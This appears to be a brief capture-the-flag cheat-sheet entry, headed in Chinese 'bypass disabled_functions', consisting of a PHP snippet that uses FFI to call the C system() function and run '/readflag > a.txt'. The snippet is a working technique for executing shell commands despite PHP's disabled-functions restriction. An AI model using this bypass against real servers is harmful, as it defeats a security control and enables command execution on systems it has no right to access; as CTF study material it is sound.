- 绕过`disabled_functions`
- ```php
  $ffi = FFI::cdef(
    "int system(const char *command);");
  $ffi->system("/readflag > a.txt");
  exit();
  ```